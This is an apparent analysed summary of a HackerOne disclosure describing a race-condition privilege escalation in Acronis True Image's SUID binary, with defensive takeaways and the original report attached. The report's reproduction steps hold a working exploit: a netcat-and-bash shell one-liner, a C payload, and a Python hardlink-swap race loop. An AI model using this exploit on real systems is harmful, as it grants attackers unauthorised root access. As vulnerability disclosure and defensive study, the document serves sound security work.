# Acronis True Image Local Privilege Escalation Due To Race Condition In Application Verification

## Metadata
- **Source:** HackerOne
- **Report:** 1251464 | https://hackerone.com/reports/1251464
- **Submitted:** 2021-07-05
- **Reporter:** vkas-afk
- **Program:** Acronis True Image
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Race Condition, Time-of-Check-Time-of-Use (TOCTOU), Privilege Escalation, Insecure File Validation
- **CVEs:** None
- **Category:** auth-crypto

## Summary
Acronis True Image contains a SUID binary that validates a secondary binary ('console') before execution but fails to lock the file during validation. An attacker can exploit a race condition window between the validation check and execution to replace the binary with malicious code, achieving local privilege escalation to root from an admin account. The vulnerability is compounded by the ability to create hardlinks to the SUID binary, allowing arbitrary directory execution.

## Attack scenario
1. Attacker creates a hardlink to the SUID binary 'Acronis True Image' in a writable directory under attacker control
2. Attacker creates a valid 'console' binary in the same directory to pass initial validation checks
3. Attacker invokes the hardlinked SUID binary, triggering validation of the 'console' binary
4. The SUID binary checks the 'console' binary for validity but does not lock/protect it during this check
5. Within the validation window, attacker deletes the legitimate 'console' binary and replaces it with a malicious binary
6. SUID binary executes the malicious 'console' binary with elevated (root) privileges, completing the privilege escalation

## Root cause
The SUID binary performs validation checks on the secondary 'console' binary but fails to implement file locking mechanisms or atomic operations. The validation and execution are separate operations without synchronization, creating a TOCTOU vulnerability. Additionally, the application does not verify execution paths to prevent hardlink attacks or restrict where the binary can be invoked from.

## Attacker mindset
An attacker with local access (unprivileged user) seeks to escalate privileges to root by exploiting improper validation sequencing in privileged code. By leveraging hardlinks to control execution context and understanding the timing window between checks and execution, the attacker can deterministically win the race condition through iterative attempts with adjustable timing delays.

## Defensive takeaways
- Implement file locking (flock, fcntl) on binaries being validated to prevent replacement during the validation window
- Use atomic operations or read the entire binary into memory before validation to eliminate TOCTOU windows
- Verify the execution directory of SUID binaries and restrict them to system directories only
- Implement path canonicalization and check for symlinks/hardlinks pointing to SUID binaries
- Use secure validation methods such as cryptographic signatures or checksums verified atomically with execution
- Apply principle of least privilege by minimizing the scope and permissions of SUID binaries
- Monitor and audit calls to system() and other process execution functions in privileged code
- Consider using AppArmor, SELinux, or similar mandatory access control to restrict SUID binary behavior

## Variant hunting
Look for similar TOCTOU vulnerabilities in other applications that: (1) use SUID/elevated privilege binaries that invoke secondary binaries, (2) perform validation in separate syscall sequences without file locks, (3) allow execution from attacker-writable directories, (4) fail to verify canonical paths or reject hardlinks, (5) use system() calls instead of direct execution with verified file descriptors. Common patterns include installer applications, privilege escalation wrappers, and helper utilities invoked by GUI applications.

## MITRE ATT&CK
- T1548.001
- T1053
- T1036.004
- T1566
- T1190

## Notes
This is a classic TOCTOU vulnerability in a real-world application with high impact. The exploit is reliable because the attacker can adjust timing (lag variable) to increase probability of winning the race. The use of hardlinks is critical to the attack as it allows the attacker to force the SUID binary to execute from an attacker-controlled directory. The PoC uses a netcat reverse shell but demonstrates the principle clearly. Acronis, being a system backup utility, runs with elevated privileges, making this a critical finding for users relying on this software for system maintenance.

## Full report
<details><summary>Expand</summary>

## Summary
The Acronis True Image application has a SUID binary "Acronis True Image" that starts another binary "console" in the same directory. The SUID binary does some checks on "console" before it is run to make sure the correct binary is being run. By using a hardlink to the SUID binary we can coerice it to try and load "console" in a chosen directory we can write to. From this point we can exploit that the SUID binary does not lock "console" whilst it checks if it is valid, we setup a environment where we can replace console at will and try to win a race where we replace the "console" binary **after** it has been checked but **before** it has been run. If we win this race we gain code execution as root from an admin account. 

## Steps To Reproduce
first we make the shell command to run 
```bash
echo "mkfifo myfifo;nc -l 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1" > shell 
```
now lets make the c program that will run this shell command naming it test.c
```c
#include <stdlib.h>
int main() 
{
	system("touch pass;bash shell");
	return 0;
}
```
compile the program
```bash
gcc test.c 
```
run the following python program
```python
import os 
import time 

os.link("/Applications/Acronis True Image.app/Contents/MacOS/Acronis True Image", "./run")
os.link("/Applications/Acronis True Image.app/Contents/MacOS/console", "./console")

lag = 0.01 
while True: 
	os.popen("./run")
	time.sleep(lag)
	os.unlink("./console")
	os.link("./a.out", "./console")
	time.sleep(1.0)
	os.unlink("./console")
	os.link("Applications/Acronis True Image.app/Contents/MacOS/console", "./console")
	lag += 0.01 
	if os.path.exists("./pass"):
		exit()
```
connect to the root shell
```bash
nc 127.0.0.1 8080
```
## Recommendations
Any binaries that are checked for validity should be locked so that they can not be replaced during validation. Additionally if possible the application should verify where it is being run from to try and prevent further symlink attacks.

## Impact

Local privilege escalation to root.

</details>

---
*Analysed by Claude on 2026-05-24*
